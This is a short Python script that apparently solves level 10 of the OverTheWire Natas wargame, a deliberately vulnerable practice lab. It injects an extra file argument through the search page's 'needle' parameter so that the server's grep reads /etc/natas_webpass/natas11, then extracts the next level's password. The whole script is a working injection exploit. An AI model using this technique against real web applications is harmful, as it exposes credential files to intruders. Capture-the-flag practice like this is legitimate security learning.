#! /usr/bin/python

import requests
import re

username = 'natas10'
password = ''

payload = '?needle=. /etc/natas_webpass/natas11 &submit=Search'
r = requests.get('http://natas10.natas.labs.overthewire.org/index.php' + payload, auth=(username, password))
pattern = r'/etc/natas_webpass/natas11:(\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
#print r.content
